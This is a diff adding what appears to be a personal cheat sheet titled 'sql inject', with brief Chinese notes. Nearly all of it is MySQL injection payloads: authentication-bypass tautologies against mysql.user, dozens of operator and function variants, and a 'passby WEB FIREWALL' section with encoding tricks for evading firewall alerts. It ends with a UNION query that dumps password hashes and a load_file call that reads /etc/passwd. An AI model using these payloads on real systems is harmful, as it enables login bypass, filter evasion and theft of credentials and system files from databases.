@@ -1,0 +1,90 @@
+sql inject
+
+user='here your input'
+' or 1=1#
+select user,host from mysql.user where user='' or 1=1#'
+'=0#
+select user,host from mysql.user where user=''=0#';
+select user,host from mysql.user where user=''>-1#';
+select user,host from mysql.user where user=''<1#';
+select user,host from mysql.user where user='1'<99#';
+select user,host from mysql.user where user=''=0=1#';
+select user,host from mysql.user where user=''<=>0#';
+select user,host from mysql.user where user=''=0=1=1=1=1=1#';
+select user,host from mysql.user where user=''=1<>1#';
+select user,host from mysql.user where user=''<>1#';
+select user,host from mysql.user where user='1'<>99999#';
+select user,host from mysql.user where user=''!=2!=3!=4#'';
+select user,host from mysql.user where user=0;                # if user is a string
+select user,host from mysql.user where user=''|0#';
+select user,host from mysql.user where user=''&0#';
+select user,host from mysql.user where user=''^0#';
+select user,host from mysql.user where user=''<<0#';
+select user,host from mysql.user where user=''>>0#';
+select user,host from mysql.user where user=''*9#';
+select user,host from mysql.user where user=''/9#';
+select user,host from mysql.user where user=''%9#';
+select user,host from mysql.user where user=''+0#';
+select user,host from mysql.user where user=''-0#';
+
+select user,host from mysql.user where user=''+2+5-7#';
+select user,host from mysql.user where user=''+0+0-0#';
+select user,host from mysql.user where user=''-0-0-0-0-0#';
+select user,host from mysql.user where user=''*9*8*7*6*5#';
+select user,host from mysql.user where user=''/2/3/4#';
+select user,host from mysql.user where user=''%12%34%56%78#';
+select user,host from mysql.user where user=''/**/+/**/0#';
+select user,host from mysql.user where user=''-----0#';
+select user,host from mysql.user where user=''+++0+++++0*0#';
+
+select user,host from mysql.user where user=''<hex(1)#';
+select user,host from mysql.user where user=''=left(0x30,1)#';
+select user,host from mysql.user where user=''=right(0,1)#';
+select user,host from mysql.user where user=''!=curdate()#';
+select user,host from mysql.user where user=''-reverse(0)#';
+select user,host from mysql.user where user=''=ltrim(0)#';
+select user,host from mysql.user where user=''<abs(1)#';
+select user,host from mysql.user where user=''*round(1,1)#';
+select user,host from mysql.user where user=''&left(0,0)#';
+select user,host from mysql.user where user=''*round(0,1)*round(0,1)#';
+
+select user,host from mysql.user where user=''=upper     (0)#';
+
+select user,host from mysql.user where user='' <1 and 1#';
+select user,host from mysql.user where user=''xor 1#';
+select user,host from mysql.user where user=''div 1#';
+select user,host from mysql.user where user=''is not null#';
+select user,host from mysql.user where user='admin' order by'';       ??
+select user,host from mysql.user where user='admin' group by'';	      ??
+select user,host from mysql.user where user=''like 0#';
+select user,host from mysql.user where user=''between 1 and 1#';
+select user,host from mysql.user where user=''regexp 1#';
+
+passby WEB FIREWALL
+select user,host from mysql.user where user=''='';
+select user,host from mysql.user where user=''<>'1';
+select user,host from mysql.user where user=''>1='';
+select user,host from mysql.user where user='0'='0';
+select user,host from mysql.user where user=''<1 and 1>'';
+select user,host from mysql.user where user=''<>ifnull(1,2)='1';
+select user,host from mysql.user where user=''=round(0,1)='1';
+select user,host from mysql.user where user=''*0*'';
+select user,host from mysql.user where user=''+'';
+select user,host from mysql.user where user=''-'';
+select user,host from mysql.user where user=''+1-1-'';
+select user,host from mysql.user where user=''+(0-0)#';
+select user,host from mysql.user where user=''=0<>((reverse(1))-(reverse(1)))#';
+select user,host from mysql.user where user=''<(8*7)*(6*5)*(4*3)#';
+select user,host from mysql.user where user=''&(1+1)-2#';
+select user,host from mysql.user where user=''>(0-100)#';
+
+一般攻击将上述字符转成16进制数，但是会被防火墙识别 （space%20 会触发报警，可以用tab%09替代，%09进一步可以用换行%0a代替）
+
+
+select user,host from mysql.user where user=''union select 1,group_concat(authentication_string) from user#';
+把中间的group_concat函数换成 load_file(0x2f6574632f706173737764) （加载密码文件/etc/passwd) #mysql5.5没有限制可以正常加载secure_file_priv选项没有设置，而mysql5.7设置了secure_file_priv，不能加载，除非是在这个目录中的文件
+
+select user,host from mysql.user where user='admin' and (select count(*) from mysql.user)=3#';     ??
+
+
+https://www.exploit-db.com/papers/18263/
